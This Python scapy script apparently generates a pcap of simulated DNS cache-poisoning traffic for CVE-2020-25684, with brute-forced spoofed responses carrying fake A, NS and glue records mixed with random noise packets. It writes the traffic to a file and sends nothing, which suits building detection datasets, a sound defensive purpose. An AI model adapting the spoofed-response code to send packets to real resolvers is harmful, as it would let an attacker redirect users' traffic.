from __future__ import division
import warnings
import time,os
import random,sys
from scapy.all import Ether, IP, UDP, DNS, DNSQR, DNSRR, wrpcap
doms=[]
with open("domains.txt") as r:
    doms=[x.strip("\n") for x in r.readlines()]
r.close()


# Function to generate a random MAC address
def generate_random_mac():
    return ":".join([format(random.randint(0, 255), '02x') for _ in range(6)])

# Function to generate random DNS noise packets
def generate_noise_packets(count):
    """Generates a specified number of random DNS noise packets."""
    noise_packets = []
    for _ in range(count):
        # Random IP addresses for noise packets
        src_ip = "192.168.1.3"
        dst_ip = "192.168.1.1"
        sport = random.randint(1024, 65535)
        dport = 53
        qname = doms[random.randint(1, len(doms))]
        
        
        # Create a noise DNS response
        transaction_id = random.randint(0, 65535)
        src_mac = generate_random_mac()
        dst_mac = generate_random_mac()
        noise_packet = Ether(src=src_mac, dst=dst_mac) / IP(src=src_ip, dst=dst_ip) / \
                        UDP(sport=dport, dport=sport) / DNS(id=transaction_id, qr=1, aa=1, qd=DNSQR(qname=qname), \
                        rcode=0, an=DNSRR(rrname=qname, rdata=f"198.51.100.{random.randint(1, 254)}", ttl=300))
    
        noise_packets.append(noise_packet)
    return noise_packets

# Target DNS resolver and domain
resolver_ip = "192.168.1.1"
resolver_mac = generate_random_mac()
authoritative_ip = "192.168.1.3"
authoritative_mac = generate_random_mac()
client_ip = "192.168.1.2"
client_mac = generate_random_mac()
target_domain = "example.com"
fake_ip = "6.6.6.6"
#num_queries = 10         # Number of DNS queries to send
num_queries = 1         # Number of DNS queries to send

num_spoofed_responses_per_query = 65535  # Number of spoofed responses per query
noise_packet_count_per_query = int(sys.argv[1])     # Number of noise packets to add per query

# Function to create DNS query packets for random subdomains
def create_dns_queries(client_ip, client_mac, resolver_ip, resolver_mac, domain, num_queries):
    packets = []
    for _ in range(num_queries):
        subdomain = f"{random.randint(1, 10000)}.{domain}"
        query_cl = Ether(src=client_mac, dst=resolver_mac) / IP(src=client_ip, dst=resolver_ip) / UDP(sport=random.randint(1024, 65535), dport=53) / DNS(rd=1, qd=DNSQR(qname=subdomain))
        query_res = Ether(src=resolver_mac, dst=authoritative_mac) / IP(src=resolver_ip, dst=authoritative_ip) / UDP(sport=random.randint(1024, 1088), dport=53) / DNS(rd=1, qd=DNSQR(qname=subdomain))

        packets.append(query_cl)
        packets.append(query_res)
    return packets

# Function to create spoofed DNS response packets with NS record
def create_spoofed_responses(resolver_ip, resolver_mac, authoritative_ip, authoritative_mac, query, num_responses):
    responses = []
    ports=[j for j in range(1024, 1088)]#optional ports
    for p in ports:
        for i in range(num_responses):
            transaction_id = i
            spoofed_response = Ether(src=authoritative_mac, dst=resolver_mac) / \
                            IP(src=authoritative_ip, dst=resolver_ip) / \
                            UDP(sport=53, dport=p) / \
                            DNS(id=transaction_id, qr=1, aa=1, qd=DNSQR(qname=query[DNSQR].qname), \
                            rcode=0,  # No error
                            an=DNSRR(rrname=query[DNSQR].qname, rdata=fake_ip, ttl=300), \
                            ns=DNSRR(rrname=query[DNSQR].qname, type="NS", rdata="ns.example.com", ttl=300), \
                            ar=DNSRR(rrname="ns.example.com", rdata=fake_ip, ttl=300))
            responses.append(spoofed_response)
    return responses

# Function to create a legitimate DNS response indicating non-existent domain
def create_legitimate_response(resolver_ip, resolver_mac, authoritative_ip, authoritative_mac, query):
    legitimate_response = Ether(src=authoritative_mac, dst=resolver_mac) / \
                          IP(src=authoritative_ip, dst=resolver_ip) / \
                          UDP(sport=53, dport=query[UDP].sport) / \
                          DNS(id=query[DNS].id, qr=1, aa=1, qd=DNSQR(qname=query[DNSQR].qname), \
                          rcode=3)  # rcode=3 means non-existent domain
    return legitimate_response


# Generate DNS queries
dns_queries = create_dns_queries(client_ip, client_mac, resolver_ip, resolver_mac, target_domain, num_queries)

# Combine the DNS queries, spoofed responses, and noise packets
packets = []
i=0
while i <(len(dns_queries)):
    
    query=dns_queries[i]
    # Add the query packet
    packets.append(dns_queries[i])
    packets.append(dns_queries[i+1])
    
    i+=2
    # Create spoofed responses
    spoofed_responses = create_spoofed_responses(resolver_ip, resolver_mac, authoritative_ip, authoritative_mac, query, num_spoofed_responses_per_query)

    # Generate noise packets
    noise_packets = generate_noise_packets(noise_packet_count_per_query)

    # Combine spoofed responses and noise packets
    combined_responses_and_noise = spoofed_responses + noise_packets

    # Shuffle the combined list to randomize order
    random.shuffle(combined_responses_and_noise)

    # Add the combined spoofed responses and noise to the packet list
    packets.extend(combined_responses_and_noise)

    # Add the legitimate response packet
    legitimate_response = create_legitimate_response(resolver_ip, resolver_mac, authoritative_ip, authoritative_mac, query)
    packets.append(legitimate_response)


# Get the initial time in nanoseconds
cur_timestamp_ns = time.time_ns()

#add the times to each packet
for i in range(len(packets)):
    p=packets[i]
    # Add one-to-three miliseconds
    cur_timestamp_ns += random.uniform(1000000, 3000000)

    # Convert nanoseconds back to seconds (float)
    timestamp_with_nanosecond_added = cur_timestamp_ns / 1_000_000_000
    p.time=timestamp_with_nanosecond_added
    packets[i]=p

os.makedirs("../attack_pcaps",exist_ok=True)
# Write packets to a pcap file
pcap_filename = f"../attack_pcaps/CVE-2020-25684_with_interleaved_noise_{noise_packet_count_per_query}_packets_rand_{random.randint(1, 10000)}.pcap"
wrpcap(pcap_filename, packets)
print(f"DNS CVE attack interleaved with {noise_packet_count_per_query} noisy packets have been written to {pcap_filename}")
